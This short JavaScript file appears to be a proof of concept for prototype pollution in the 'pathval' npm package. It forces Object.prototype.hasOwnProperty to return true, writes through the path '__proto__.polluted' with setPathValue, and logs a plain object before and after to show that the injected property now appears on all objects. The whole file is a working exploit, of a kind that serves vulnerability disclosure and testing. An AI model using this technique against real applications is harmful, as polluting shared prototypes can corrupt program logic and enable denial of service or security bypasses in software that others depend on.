Object.prototype.hasOwnProperty = () => true;
var pathval = require('pathval');
var obj = {};
console.log({}.polluted);
pathval.setPathValue(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);